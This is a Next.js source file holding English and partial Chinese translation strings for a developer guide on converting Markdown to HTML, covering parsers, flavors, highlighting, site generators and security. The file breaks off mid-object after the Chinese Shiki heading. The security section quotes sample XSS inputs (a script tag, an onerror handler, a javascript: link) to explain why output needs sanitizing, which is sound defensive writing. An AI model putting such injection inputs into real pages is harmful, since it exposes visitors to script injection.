'use client';
import Link from 'next/link';
import React from 'react';

const translations: Record<string, Record<string, string>> = {
  en: {
    title: 'Markdown to HTML Online: The Complete Developer Guide',
    tldr: 'TL;DR',
    tldrText: 'Markdown is a lightweight markup language that converts plain text into structured HTML. Developers use it for documentation, README files, blog posts, and technical writing. You can convert Markdown to HTML using JavaScript libraries (marked, remark, markdown-it), Python packages (markdown, mistune), or Go modules (goldmark, blackfriday). Always sanitize generated HTML to prevent XSS attacks. Use our free online Markdown Preview tool for instant conversion.',
    keyTakeaways: 'Key Takeaways',
    kt1: 'Markdown is a plain-text formatting syntax designed to be readable as-is and convertible to valid HTML.',
    kt2: 'CommonMark provides a strict specification; GFM (GitHub Flavored Markdown) adds tables, task lists, and strikethrough; MDX embeds JSX components.',
    kt3: 'The most popular JavaScript parsers are marked (fast, minimal), remark (AST-based, plugin ecosystem), and markdown-it (extensible, CommonMark compliant).',
    kt4: 'Always sanitize Markdown-generated HTML with DOMPurify or similar libraries to prevent cross-site scripting (XSS) vulnerabilities.',
    kt5: 'Syntax highlighting for code blocks can be added via highlight.js, Prism, or Shiki, each with different trade-offs in bundle size and theme support.',
    kt6: 'Static site generators like Next.js, Gatsby, Hugo, and Jekyll all have first-class Markdown support with different processing pipelines.',
    kt7: 'Extensions like KaTeX (math), Mermaid (diagrams), and footnotes expand Markdown far beyond basic text formatting.',
    tryTool: 'Try Our Free Markdown Preview Tool',
    tryToolDesc: 'Convert Markdown to HTML instantly with live preview, syntax highlighting, and export options.',

    h2_what: '1. What Is Markdown and Why Convert to HTML?',
    p_what_1: 'Markdown is a lightweight markup language created by John Gruber and Aaron Swartz in 2004. Its primary design goal was to create a plain-text formatting syntax that is easy to read and write, and that can be converted to structurally valid HTML. Unlike HTML, where you write <code>&lt;strong&gt;bold&lt;/strong&gt;</code>, in Markdown you simply write <code>**bold**</code>.',
    p_what_2: 'The key reason developers convert Markdown to HTML is that browsers render HTML, not Markdown. When you write documentation in Markdown, it must be transformed into HTML before it can be displayed on a webpage. This conversion happens either at build time (static site generators), at request time (server-side rendering), or in the browser (client-side JavaScript).',
    p_what_3: 'Markdown has become the de facto standard for developer documentation. GitHub, GitLab, Bitbucket, Stack Overflow, Reddit, Discord, and countless other platforms all support Markdown. README files, API documentation, blog posts, technical books, and even email newsletters are commonly authored in Markdown.',

    h2_syntax: '2. Markdown Syntax Reference',
    p_syntax_intro: 'This section covers the core Markdown syntax elements that every developer should know. All of these convert directly to their HTML counterparts.',
    h3_headings: 'Headings',
    p_headings: 'Markdown supports six levels of headings, corresponding to HTML <code>&lt;h1&gt;</code> through <code>&lt;h6&gt;</code>. Use hash symbols (#) at the beginning of a line.',
    h3_emphasis: 'Emphasis: Bold, Italic, Strikethrough',
    p_emphasis: 'Surround text with asterisks or underscores for emphasis. Single for italic (<code>*italic*</code> becomes <code>&lt;em&gt;</code>), double for bold (<code>**bold**</code> becomes <code>&lt;strong&gt;</code>), and triple for both. GFM adds strikethrough with tildes (<code>~~deleted~~</code> becomes <code>&lt;del&gt;</code>).',
    h3_lists: 'Lists: Ordered, Unordered, Nested',
    p_lists: 'Unordered lists use <code>-</code>, <code>*</code>, or <code>+</code> as bullet markers. Ordered lists use numbers followed by a period. Nesting is achieved by indenting with two or four spaces. Markdown lists convert to HTML <code>&lt;ul&gt;</code>, <code>&lt;ol&gt;</code>, and <code>&lt;li&gt;</code> elements.',
    h3_links: 'Links and Images',
    p_links: 'Inline links use the syntax <code>[text](url)</code>, which becomes <code>&lt;a href="url"&gt;text&lt;/a&gt;</code>. Images use the same pattern with an exclamation mark prefix: <code>![alt](src)</code> becomes <code>&lt;img src="src" alt="alt"&gt;</code>. Reference-style links allow you to define URLs at the bottom of your document for cleaner source text.',
    h3_code: 'Code: Inline and Blocks',
    p_code: 'Surround inline code with single backticks: <code>`code`</code> becomes <code>&lt;code&gt;code&lt;/code&gt;</code>. For code blocks, use triple backticks (```) with an optional language identifier for syntax highlighting. Code blocks are wrapped in <code>&lt;pre&gt;&lt;code&gt;</code> elements.',
    h3_tables: 'Tables',
    p_tables: 'Tables use pipes (|) to delimit columns and hyphens (-) for the header separator. Column alignment is controlled by colons in the separator row: left (<code>:---</code>), center (<code>:---:</code>), or right (<code>---:</code>). Tables convert to standard HTML <code>&lt;table&gt;</code>, <code>&lt;thead&gt;</code>, <code>&lt;tbody&gt;</code>, <code>&lt;tr&gt;</code>, <code>&lt;th&gt;</code>, and <code>&lt;td&gt;</code> elements.',
    h3_blockquotes: 'Blockquotes and Horizontal Rules',
    p_blockquotes: 'Blockquotes use the <code>&gt;</code> character at the start of a line, converting to <code>&lt;blockquote&gt;</code>. They can be nested by adding additional <code>&gt;</code> characters. Horizontal rules are created with three or more hyphens (<code>---</code>), asterisks (<code>***</code>), or underscores (<code>___</code>), producing an <code>&lt;hr&gt;</code> element.',

    h2_flavors: '3. Markdown Flavors: CommonMark, GFM, and MDX',
    p_flavors_intro: 'Not all Markdown is created equal. The original Markdown specification left many edge cases undefined, leading to different implementations producing different output. Here are the three most important Markdown flavors in 2026.',
    h3_commonmark: 'CommonMark',
    p_commonmark: 'CommonMark is a strongly defined, highly compatible specification of Markdown. It was created to eliminate ambiguity in the original Markdown spec. CommonMark defines exactly how every edge case should be handled, from nested lists to inline HTML. Most modern Markdown parsers (markdown-it, remark) are CommonMark compliant or offer a CommonMark mode.',
    h3_gfm: 'GitHub Flavored Markdown (GFM)',
    p_gfm: 'GFM is a superset of CommonMark used on GitHub. It adds several extensions that developers rely on daily: tables with alignment, task lists with checkboxes (<code>- [x] done</code>), strikethrough text, autolinked URLs, and fenced code blocks with language identifiers. GFM also supports alerts (<code>[!NOTE]</code>, <code>[!WARNING]</code>) and Mermaid diagram rendering.',
    h3_mdx: 'MDX: Markdown + JSX',
    p_mdx: 'MDX lets you embed JSX components directly inside Markdown content. This is particularly popular in documentation frameworks like Docusaurus and in Next.js-based blogs. With MDX, you can import React components and use them alongside standard Markdown. MDX files typically have a <code>.mdx</code> extension and require a special compiler (@mdx-js/mdx) that outputs React components instead of HTML strings.',

    h2_js: '4. Converting Markdown to HTML with JavaScript',
    p_js_intro: 'JavaScript offers the most diverse ecosystem of Markdown processors. Here are the four most popular options, each with different strengths.',
    h3_marked: 'marked',
    p_marked: 'marked is one of the oldest and fastest Markdown parsers for JavaScript. It compiles Markdown to HTML in a single pass, making it exceptionally fast. It supports GFM by default, has a small bundle size (around 35 KB minified), and is well-suited for both Node.js and browser environments. Configuration is straightforward with options for GFM, tables, breaks, and custom renderers.',
    h3_remark: 'remark (unified ecosystem)',
    p_remark: 'remark is part of the unified ecosystem, which processes content as abstract syntax trees (ASTs). This approach gives you fine-grained control over the transformation pipeline. remark parses Markdown into an mdast tree, which can be transformed with plugins, then serialized to HTML with remark-rehype and rehype-stringify. The plugin ecosystem is extensive: remark-gfm for GitHub Flavored Markdown, remark-math for LaTeX, remark-mermaid for diagrams, and hundreds more.',
    h3_markdownit: 'markdown-it',
    p_markdownit: 'markdown-it is a fast, CommonMark-compliant Markdown parser with a rich plugin architecture. It uses a token-based approach that makes it easy to extend with custom syntax. Plugins exist for footnotes, definition lists, abbreviations, containers, and many other extensions. Its performance is close to marked, and it offers fine-grained control over enabled features.',
    h3_unified: 'unified pipeline',
    p_unified: 'The unified pipeline (remark + rehype) is the most flexible approach. You parse Markdown to mdast (Markdown AST) with remark-parse, optionally transform the tree, convert to hast (HTML AST) with remark-rehype, add HTML plugins like rehype-highlight for syntax highlighting, and finally serialize to HTML with rehype-stringify. This modular approach lets you compose exactly the pipeline you need.',

    h2_python: '5. Converting Markdown to HTML with Python',
    p_python_intro: 'Python has several mature Markdown libraries suitable for different use cases.',
    h3_python_markdown: 'Python-Markdown',
    p_python_markdown: 'The <code>markdown</code> package is the standard Python Markdown library. It converts Markdown text to HTML and supports extensions for tables, fenced code, footnotes, table of contents, and more. Extensions can be loaded individually, and you can write custom extensions by subclassing the preprocessor, treeprocessor, or postprocessor classes.',
    h3_mistune: 'mistune',
    p_mistune: 'mistune is a fast Markdown parser written in pure Python. Version 3.x uses a pluggable architecture with directives and plugins. It provides both HTML rendering and AST output, making it suitable for both simple conversion and complex transformations. mistune is significantly faster than Python-Markdown for large documents.',
    h3_python_md_extensions: 'PyMdown Extensions',
    p_python_md_extensions: 'PyMdown Extensions is a collection of extensions for Python-Markdown that adds features like BetterEm (improved emphasis handling), SuperFences (nested fenced code blocks), Highlight (syntax highlighting with Pygments), Tasklist, Emoji, and many more. It is commonly used with MkDocs for documentation sites.',

    h2_go: '6. Converting Markdown to HTML in Go',
    p_go_intro: 'Go offers high-performance Markdown parsers suitable for server-side rendering and static site generation.',
    h3_goldmark: 'goldmark',
    p_goldmark: 'goldmark is the default Markdown parser used by Hugo (the static site generator). It is CommonMark compliant, extensible, and fast. goldmark uses an AST-based approach and supports extensions for GFM (tables, strikethrough, task lists, autolinks), syntax highlighting (with Chroma), footnotes, definition lists, and typographic substitutions. Its architecture makes it easy to write custom extensions.',
    h3_blackfriday: 'blackfriday',
    p_blackfriday: 'blackfriday (v2) is a fast Markdown processor for Go. While goldmark has become more popular for new projects due to its CommonMark compliance and extensibility, blackfriday remains widely used in existing codebases. It supports common extensions, smart punctuation, and HTML rendering with configurable flags.',

    h2_highlight: '7. Syntax Highlighting in Code Blocks',
    p_highlight_intro: 'Code blocks are one of the most important Markdown features for developer documentation. Syntax highlighting transforms raw code text into colored, readable output. Here are the three main approaches.',
    h3_highlightjs: 'highlight.js',
    p_highlightjs: 'highlight.js is the most widely used syntax highlighter, supporting over 190 languages and 90+ themes. It can run both server-side and client-side. In a Markdown pipeline, you typically integrate it via rehype-highlight (unified) or the highlight option in marked. highlight.js auto-detects languages when no language is specified, though explicit language hints are more reliable.',
    h3_prism: 'Prism',
    p_prism: 'Prism is a lightweight, extensible syntax highlighter with a modular architecture. Languages and plugins are loaded on demand, keeping the bundle small. Prism supports features like line numbers, line highlighting, copy-to-clipboard buttons, and diff highlighting. It is the default highlighter in Docusaurus and many documentation sites.',
    h3_shiki: 'Shiki',
    p_shiki: 'Shiki uses TextMate grammars and VS Code themes for syntax highlighting, producing the same accurate coloring you see in Visual Studio Code. It runs at build time, generating pre-highlighted HTML with inline styles, so no client-side JavaScript is needed. This makes it ideal for static site generators. Shiki supports hundreds of languages and all VS Code themes.',

    h2_ssg: '8. Markdown in Static Site Generators',
    p_ssg_intro: 'Static site generators transform Markdown files into HTML pages at build time. Each framework handles Markdown differently.',
    h3_nextjs: 'Next.js',
    p_nextjs: 'Next.js supports Markdown through several approaches. You can use next-mdx-remote or @next/mdx for MDX support, allowing React components inside Markdown. For standard Markdown, you can use gray-matter for frontmatter parsing combined with remark/rehype for HTML conversion. Next.js 15+ supports both static generation and server components for Markdown content.',
    h3_gatsby: 'Gatsby',
    p_gatsby: 'Gatsby has built-in Markdown support through gatsby-transformer-remark, which uses remark under the hood. Plugins like gatsby-remark-images, gatsby-remark-prismjs, and gatsby-remark-autolink-headers extend the processing pipeline. Gatsby creates GraphQL nodes from Markdown files, making them queryable in your components.',
    h3_hugo: 'Hugo',
    p_hugo: 'Hugo uses goldmark as its default Markdown renderer, with built-in support for syntax highlighting via Chroma. Hugo is the fastest static site generator, capable of rendering thousands of Markdown pages in seconds. It supports custom shortcodes that extend Markdown with template-driven components.',
    h3_jekyll: 'Jekyll',
    p_jekyll: 'Jekyll, the Ruby-based static site generator that powers GitHub Pages, uses kramdown as its default Markdown renderer. kramdown supports GFM, math blocks, footnotes, and definition lists. Jekyll processes Markdown files with YAML front matter and supports Liquid template tags within Markdown content.',

    h2_extensions: '9. Markdown Extensions: Math, Diagrams, Footnotes',
    p_extensions_intro: 'Markdown extensions expand the language beyond basic text formatting, enabling technical and academic content.',
    h3_katex: 'Math with KaTeX',
    p_katex: 'KaTeX is a fast math typesetting library that renders LaTeX expressions to HTML. In Markdown, you typically use dollar-sign delimiters: <code>$inline$</code> for inline math and <code>$$block$$</code> for display math. Integration libraries include remark-math + rehype-katex (unified), markdown-it-katex (markdown-it), and katex auto-render for client-side rendering. KaTeX is significantly faster than MathJax and produces high-quality output.',
    h3_mermaid: 'Diagrams with Mermaid',
    p_mermaid: 'Mermaid generates diagrams and charts from text definitions inside Markdown code blocks. It supports flowcharts, sequence diagrams, class diagrams, state diagrams, entity-relationship diagrams, Gantt charts, and more. GitHub natively renders Mermaid diagrams in Markdown files. For other environments, you can use remark-mermaid or render diagrams client-side with the Mermaid JavaScript library.',
    h3_footnotes: 'Footnotes',
    p_footnotes: 'Footnotes let you add references at the bottom of your document. The syntax uses square brackets with a caret: <code>[^1]</code> for the reference and <code>[^1]: Footnote text</code> for the definition. Most Markdown processors support footnotes through extensions: remark-footnotes (remark), markdown-it-footnote (markdown-it), and the footnotes extension in Python-Markdown.',

    h2_security: '10. Security: Sanitizing HTML Output (XSS Prevention)',
    p_security_intro: 'Converting Markdown to HTML introduces a significant security concern: cross-site scripting (XSS). Markdown allows inline HTML, which means an attacker can inject malicious scripts into Markdown content that will be rendered as HTML.',
    h3_xss_risks: 'XSS Risks in Markdown',
    p_xss_risks: 'Markdown supports inline HTML by design. This means content like <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>, <code>&lt;img onerror="malicious()"&gt;</code>, and <code>&lt;a href="javascript:..."&gt;</code> can all be embedded in Markdown and will pass through to the HTML output. If you render user-submitted Markdown without sanitization, you are vulnerable to XSS attacks.',
    h3_dompurify: 'DOMPurify',
    p_dompurify: 'DOMPurify is the gold standard for HTML sanitization in JavaScript. It removes all dangerous HTML while preserving safe content. Use it after converting Markdown to HTML: first parse Markdown to HTML with your chosen library, then pass the HTML through DOMPurify.sanitize(). DOMPurify works in both browser and Node.js environments (via jsdom or the isomorphic-dompurify package).',
    h3_rehype_sanitize: 'rehype-sanitize',
    p_rehype_sanitize: 'If you are using the unified/rehype pipeline, rehype-sanitize integrates directly into your processing chain. It operates on the HTML AST, removing dangerous nodes before serialization. You can use the default GitHub schema or define custom allow-lists for tags, attributes, and protocols.',
    h3_best_practices: 'Security Best Practices',
    p_best_practices: 'Always sanitize Markdown-generated HTML, especially for user-submitted content. Disable inline HTML in your Markdown parser when possible (most parsers have an option for this). Use Content Security Policy (CSP) headers as an additional defense layer. Never use <code>dangerouslySetInnerHTML</code> in React without first sanitizing the HTML. For server-rendered content, sanitize on the server before sending HTML to the client.',

    h2_docs: '11. Markdown in Documentation Systems',
    p_docs_intro: 'Modern documentation platforms are built on Markdown, each adding their own extensions and conventions.',
    h3_docusaurus: 'Docusaurus',
    p_docusaurus: 'Docusaurus (by Meta) uses MDX as its Markdown engine, allowing React components inside documentation pages. It provides built-in support for versioning, search (Algolia), internationalization, admonitions (note, tip, warning, danger), tabs, code block features (title, line highlighting, live editor), and automatic sidebar generation from the file system.',
    h3_mkdocs: 'MkDocs',
    p_mkdocs: 'MkDocs is a Python-based documentation generator that uses Python-Markdown. Combined with the Material for MkDocs theme and PyMdown Extensions, it offers a rich feature set: admonitions, tabbed content, content tabs, code annotations, diagrams, and social cards. Configuration is done through a single <code>mkdocs.yml</code> file.',
    h3_mintlify: 'Mintlify',
    p_mintlify: 'Mintlify is a modern documentation platform that uses MDX. It provides beautiful default styling, API documentation generation from OpenAPI specs, built-in analytics, custom components (accordions, cards, tabs, code groups), and automatic deployment. It is popular for developer-facing API documentation.',

    h2_performance: '12. Performance: Incremental Parsing and Caching',
    p_performance_intro: 'When processing large volumes of Markdown content, performance becomes critical. Here are strategies for optimizing Markdown-to-HTML conversion.',
    h3_incremental: 'Incremental Parsing',
    p_incremental: 'Instead of re-parsing entire documents on every change, incremental parsing updates only the affected portions. This is particularly important for live preview editors where the user types continuously. Libraries like CodeMirror use incremental parsing to maintain responsive editing of large Markdown documents.',
    h3_caching: 'Build-Time Caching',
    p_caching: 'Static site generators should cache parsed Markdown output to avoid redundant processing. Next.js uses ISR (Incremental Static Regeneration) to cache rendered pages. Hugo maintains a build cache for unchanged content. For custom pipelines, implement content-addressed caching: hash the Markdown source and check for existing output before parsing.',
    h3_streaming: 'Streaming and Lazy Rendering',
    p_streaming: 'For large documents, consider streaming the HTML output or rendering sections lazily. React Server Components in Next.js can stream Markdown content section by section. For long documentation pages, lazy-load below-the-fold sections using the Intersection Observer API combined with dynamic imports.',

    h2_faq: 'Frequently Asked Questions',
    faq1_q: 'What is the best JavaScript library for converting Markdown to HTML?',
    faq1_a: 'It depends on your use case. marked is the fastest and simplest for basic conversion. remark (unified) offers the most extensibility through its plugin ecosystem. markdown-it provides a good balance of speed and features with CommonMark compliance. For MDX (Markdown + React components), use @mdx-js/mdx.',
    faq2_q: 'How do I prevent XSS attacks when rendering Markdown as HTML?',
    faq2_a: 'Always sanitize the HTML output after converting Markdown. Use DOMPurify for client-side sanitization, rehype-sanitize for unified/rehype pipelines, or bleach for Python. Additionally, disable raw HTML in your Markdown parser when possible, and implement Content Security Policy (CSP) headers.',
    faq3_q: 'What is the difference between CommonMark, GFM, and MDX?',
    faq3_a: 'CommonMark is a strict specification of standard Markdown that resolves ambiguities in the original spec. GFM (GitHub Flavored Markdown) extends CommonMark with tables, task lists, strikethrough, autolinks, and alerts. MDX extends Markdown with JSX component support, allowing you to use React components directly in Markdown files.',
    faq4_q: 'How do I add syntax highlighting to Markdown code blocks?',
    faq4_a: 'Specify the language after the opening triple backticks (e.g., ```javascript). Then use a syntax highlighting library: highlight.js for broad language support, Prism for lightweight modular highlighting, or Shiki for VS Code-quality highlighting at build time. Integration depends on your Markdown parser and pipeline.',
    faq5_q: 'Can I use Markdown with React and Next.js?',
    faq5_a: 'Yes. Next.js supports Markdown through @next/mdx for MDX files, next-mdx-remote for remote MDX content, or a custom pipeline with gray-matter (frontmatter) and remark/rehype (conversion). MDX is the most popular choice because it allows embedding React components directly in Markdown content.',
    faq6_q: 'What is the fastest way to convert Markdown to HTML?',
    faq6_a: 'For JavaScript, marked is the fastest pure JavaScript parser. For Go, goldmark (used by Hugo) offers exceptional performance. For build-time conversion, pre-process Markdown during your build step and cache the output. Avoid parsing Markdown at request time in production; instead, use static generation or incremental static regeneration.',
    faq7_q: 'How do I render math equations in Markdown?',
    faq7_a: 'Use KaTeX or MathJax to render LaTeX math expressions. In Markdown, wrap inline math with single dollar signs ($E = mc^2$) and block math with double dollar signs. Integrate via remark-math and rehype-katex for the unified pipeline, or use markdown-it-katex for markdown-it. KaTeX is faster than MathJax and is recommended for most use cases.',
    faq8_q: 'Is Markdown suitable for large-scale documentation?',
    faq8_a: 'Yes. Markdown is used for documentation at companies like GitHub, Meta (Docusaurus), Google (various projects), and Stripe (Mintlify). For large-scale documentation, use a documentation framework (Docusaurus, MkDocs, Mintlify) that provides versioning, search, navigation, and internationalization. Combine with a Git-based workflow for collaboration and review.',

    conclusion: 'Markdown remains the universal language for developer content in 2026. Whether you are building documentation sites, blog platforms, or content management systems, understanding how Markdown converts to HTML, and how to do it securely and performantly, is an essential developer skill. Try our free online Markdown Preview tool to see the conversion in action.',
  },
  zh: {
    title: 'Markdown 转 HTML 在线指南：开发者完全手册',
    tldr: '概要',
    tldrText: 'Markdown 是一种轻量级标记语言，能将纯文本转换为结构化的 HTML。开发者用它来编写文档、README 文件、博客文章和技术写作。你可以使用 JavaScript 库（marked、remark、markdown-it）、Python 包（markdown、mistune）或 Go 模块（goldmark、blackfriday）将 Markdown 转换为 HTML。务必对生成的 HTML 进行消毒处理以防止 XSS 攻击。使用我们的免费在线 Markdown 预览工具即可即时转换。',
    keyTakeaways: '核心要点',
    kt1: 'Markdown 是一种纯文本格式语法，设计为可直接阅读并可转换为有效的 HTML。',
    kt2: 'CommonMark 提供严格规范；GFM（GitHub 风格 Markdown）增加了表格、任务列表和删除线；MDX 可嵌入 JSX 组件。',
    kt3: '最流行的 JavaScript 解析器是 marked（快速、轻量）、remark（基于 AST、插件生态）和 markdown-it（可扩展、符合 CommonMark）。',
    kt4: '务必使用 DOMPurify 或类似库对 Markdown 生成的 HTML 进行消毒，以防止跨站脚本（XSS）漏洞。',
    kt5: '代码块的语法高亮可通过 highlight.js、Prism 或 Shiki 添加，各有不同的包体积和主题支持。',
    kt6: 'Next.js、Gatsby、Hugo 和 Jekyll 等静态站点生成器都对 Markdown 有一流支持，但处理管线各不相同。',
    kt7: 'KaTeX（数学公式）、Mermaid（图表）和脚注等扩展将 Markdown 的能力远远扩展到基本文本格式之外。',
    tryTool: '试用我们的免费 Markdown 预览工具',
    tryToolDesc: '即时将 Markdown 转换为 HTML，支持实时预览、语法高亮和导出选项。',

    h2_what: '1. 什么是 Markdown？为什么要转换为 HTML？',
    p_what_1: 'Markdown 是由 John Gruber 和 Aaron Swartz 于 2004 年创建的轻量级标记语言。其核心设计目标是创建一种易于阅读和编写的纯文本格式语法，并且可以转换为结构有效的 HTML。与 HTML 中需要写 <code>&lt;strong&gt;粗体&lt;/strong&gt;</code> 不同，Markdown 中你只需写 <code>**粗体**</code>。',
    p_what_2: '开发者将 Markdown 转换为 HTML 的主要原因是浏览器渲染的是 HTML 而非 Markdown。当你用 Markdown 编写文档时，必须将其转换为 HTML 才能在网页上显示。这种转换可以发生在构建时（静态站点生成器）、请求时（服务端渲染）或浏览器中（客户端 JavaScript）。',
    p_what_3: 'Markdown 已成为开发者文档的事实标准。GitHub、GitLab、Bitbucket、Stack Overflow、Reddit、Discord 等众多平台都支持 Markdown。README 文件、API 文档、博客文章、技术书籍甚至电子邮件通讯都通常使用 Markdown 编写。',

    h2_syntax: '2. Markdown 语法参考',
    p_syntax_intro: '本节涵盖每个开发者都应了解的核心 Markdown 语法元素，它们都可直接转换为对应的 HTML 元素。',
    h3_headings: '标题',
    p_headings: 'Markdown 支持六级标题，对应 HTML 的 <code>&lt;h1&gt;</code> 到 <code>&lt;h6&gt;</code>。在行首使用井号（#）。',
    h3_emphasis: '强调：粗体、斜体、删除线',
    p_emphasis: '用星号或下划线包围文本来添加强调。单个表示斜体（<code>*斜体*</code> 变为 <code>&lt;em&gt;</code>），双个表示粗体（<code>**粗体**</code> 变为 <code>&lt;strong&gt;</code>），三个表示两者兼有。GFM 用波浪号添加删除线（<code>~~删除~~</code> 变为 <code>&lt;del&gt;</code>）。',
    h3_lists: '列表：有序、无序、嵌套',
    p_lists: '无序列表使用 <code>-</code>、<code>*</code> 或 <code>+</code> 作为项目符号。有序列表使用数字加句点。通过缩进两到四个空格实现嵌套。Markdown 列表转换为 HTML 的 <code>&lt;ul&gt;</code>、<code>&lt;ol&gt;</code> 和 <code>&lt;li&gt;</code> 元素。',
    h3_links: '链接和图片',
    p_links: '行内链接使用 <code>[文本](url)</code> 语法，转换为 <code>&lt;a href="url"&gt;文本&lt;/a&gt;</code>。图片使用相同模式加感叹号前缀：<code>![替代文本](src)</code> 转换为 <code>&lt;img src="src" alt="替代文本"&gt;</code>。引用式链接允许你在文档底部定义 URL，使源文本更整洁。',
    h3_code: '代码：行内和代码块',
    p_code: '用单个反引号包围行内代码：<code>`code`</code> 变为 <code>&lt;code&gt;code&lt;/code&gt;</code>。代码块使用三个反引号（```）和可选的语言标识符实现语法高亮。代码块包装在 <code>&lt;pre&gt;&lt;code&gt;</code> 元素中。',
    h3_tables: '表格',
    p_tables: '表格使用竖线（|）分隔列，使用连字符（-）作为表头分隔符。列对齐通过分隔行中的冒号控制：左对齐（<code>:---</code>）、居中（<code>:---:</code>）或右对齐（<code>---:</code>）。表格转换为标准 HTML 的 <code>&lt;table&gt;</code>、<code>&lt;thead&gt;</code>、<code>&lt;tbody&gt;</code>、<code>&lt;tr&gt;</code>、<code>&lt;th&gt;</code> 和 <code>&lt;td&gt;</code> 元素。',
    h3_blockquotes: '引用块和水平线',
    p_blockquotes: '引用块在行首使用 <code>&gt;</code> 字符，转换为 <code>&lt;blockquote&gt;</code>。可以通过添加额外的 <code>&gt;</code> 来嵌套。水平线使用三个或更多的连字符（<code>---</code>）、星号（<code>***</code>）或下划线（<code>___</code>）创建，生成 <code>&lt;hr&gt;</code> 元素。',

    h2_flavors: '3. Markdown 变体：CommonMark、GFM 和 MDX',
    p_flavors_intro: '并非所有 Markdown 都是一样的。原始 Markdown 规范留下了许多未定义的边界情况，导致不同实现产生不同输出。以下是 2026 年最重要的三种 Markdown 变体。',
    h3_commonmark: 'CommonMark',
    p_commonmark: 'CommonMark 是一个严格定义、高度兼容的 Markdown 规范。它的创建旨在消除原始 Markdown 规范中的歧义。CommonMark 精确定义了每种边界情况的处理方式，从嵌套列表到内联 HTML。大多数现代 Markdown 解析器（markdown-it、remark）都符合 CommonMark 或提供 CommonMark 模式。',
    h3_gfm: 'GitHub 风格 Markdown（GFM）',
    p_gfm: 'GFM 是 GitHub 上使用的 CommonMark 超集。它添加了开发者日常依赖的多个扩展：带对齐的表格、带复选框的任务列表（<code>- [x] 完成</code>）、删除线文本、自动链接 URL 和带语言标识符的围栏代码块。GFM 还支持警告提示（<code>[!NOTE]</code>、<code>[!WARNING]</code>）和 Mermaid 图表渲染。',
    h3_mdx: 'MDX：Markdown + JSX',
    p_mdx: 'MDX 允许你直接在 Markdown 内容中嵌入 JSX 组件。这在 Docusaurus 等文档框架和基于 Next.js 的博客中特别流行。使用 MDX，你可以导入 React 组件并将其与标准 Markdown 一起使用。MDX 文件通常使用 <code>.mdx</code> 扩展名，需要特殊编译器（@mdx-js/mdx）输出 React 组件而非 HTML 字符串。',

    h2_js: '4. 使用 JavaScript 将 Markdown 转换为 HTML',
    p_js_intro: 'JavaScript 提供了最多样化的 Markdown 处理器生态系统。以下是四个最流行的选项，各有不同优势。',
    h3_marked: 'marked',
    p_marked: 'marked 是 JavaScript 中最古老且最快的 Markdown 解析器之一。它通过单次遍历将 Markdown 编译为 HTML，速度极快。默认支持 GFM，包体积小（约 35 KB 压缩后），适用于 Node.js 和浏览器环境。配置简单，支持 GFM、表格、换行和自定义渲染器等选项。',
    h3_remark: 'remark（unified 生态系统）',
    p_remark: 'remark 是 unified 生态系统的一部分，将内容处理为抽象语法树（AST）。这种方法让你对转换管线有细粒度的控制。remark 将 Markdown 解析为 mdast 树，可通过插件转换，然后通过 remark-rehype 和 rehype-stringify 序列化为 HTML。插件生态丰富：remark-gfm 用于 GitHub 风格 Markdown，remark-math 用于 LaTeX，remark-mermaid 用于图表等。',
    h3_markdownit: 'markdown-it',
    p_markdownit: 'markdown-it 是一个快速、符合 CommonMark 的 Markdown 解析器，具有丰富的插件架构。它使用基于令牌的方法，便于用自定义语法扩展。插件涵盖脚注、定义列表、缩写、容器等多种扩展。性能接近 marked，并提供对启用功能的细粒度控制。',
    h3_unified: 'unified 管线',
    p_unified: 'unified 管线（remark + rehype）是最灵活的方法。你用 remark-parse 将 Markdown 解析为 mdast（Markdown AST），可选地转换语法树，用 remark-rehype 转换为 hast（HTML AST），添加 HTML 插件如 rehype-highlight 用于语法高亮，最后用 rehype-stringify 序列化为 HTML。这种模块化方法让你精确组合所需的管线。',

    h2_python: '5. 使用 Python 将 Markdown 转换为 HTML',
    p_python_intro: 'Python 有多个成熟的 Markdown 库，适用于不同的使用场景。',
    h3_python_markdown: 'Python-Markdown',
    p_python_markdown: '<code>markdown</code> 包是标准的 Python Markdown 库。它将 Markdown 文本转换为 HTML，支持表格、围栏代码、脚注、目录等扩展。扩展可以单独加载，你也可以通过子类化预处理器、树处理器或后处理器来编写自定义扩展。',
    h3_mistune: 'mistune',
    p_mistune: 'mistune 是一个用纯 Python 编写的快速 Markdown 解析器。3.x 版本使用可插拔架构，支持指令和插件。它提供 HTML 渲染和 AST 输出，适用于简单转换和复杂变换。mistune 在处理大文档时比 Python-Markdown 快得多。',
    h3_python_md_extensions: 'PyMdown Extensions',
    p_python_md_extensions: 'PyMdown Extensions 是 Python-Markdown 的扩展集合，添加了 BetterEm（改进的强调处理）、SuperFences（嵌套围栏代码块）、Highlight（使用 Pygments 语法高亮）、Tasklist、Emoji 等功能。常与 MkDocs 一起用于文档站点。',

    h2_go: '6. 使用 Go 将 Markdown 转换为 HTML',
    p_go_intro: 'Go 提供高性能的 Markdown 解析器，适用于服务端渲染和静态站点生成。',
    h3_goldmark: 'goldmark',
    p_goldmark: 'goldmark 是 Hugo（静态站点生成器）使用的默认 Markdown 解析器。它符合 CommonMark、可扩展且快速。goldmark 使用基于 AST 的方法，支持 GFM（表格、删除线、任务列表、自动链接）、语法高亮（使用 Chroma）、脚注、定义列表和排版替换等扩展。其架构便于编写自定义扩展。',
    h3_blackfriday: 'blackfriday',
    p_blackfriday: 'blackfriday（v2）是一个快速的 Go Markdown 处理器。虽然 goldmark 因其 CommonMark 兼容性和可扩展性而在新项目中更受欢迎，但 blackfriday 在现有代码库中仍被广泛使用。它支持常见扩展、智能标点和可配置标志的 HTML 渲染。',

    h2_highlight: '7. 代码块的语法高亮',
    p_highlight_intro: '代码块是开发者文档中最重要的 Markdown 功能之一。语法高亮将原始代码文本转换为带颜色的可读输出。以下是三种主要方法。',
    h3_highlightjs: 'highlight.js',
    p_highlightjs: 'highlight.js 是使用最广泛的语法高亮器，支持超过 190 种语言和 90 多个主题。它可以在服务端和客户端运行。在 Markdown 管线中，通常通过 rehype-highlight（unified）或 marked 的 highlight 选项集成。highlight.js 在未指定语言时自动检测语言，但明确的语言提示更可靠。',
    h3_prism: 'Prism',
    p_prism: 'Prism 是一个轻量级、可扩展的语法高亮器，具有模块化架构。语言和插件按需加载，保持包体积小。Prism 支持行号、行高亮、复制到剪贴板按钮和 diff 高亮等功能。它是 Docusaurus 和许多文档站点的默认高亮器。',
    h3_shiki: 'Shiki',
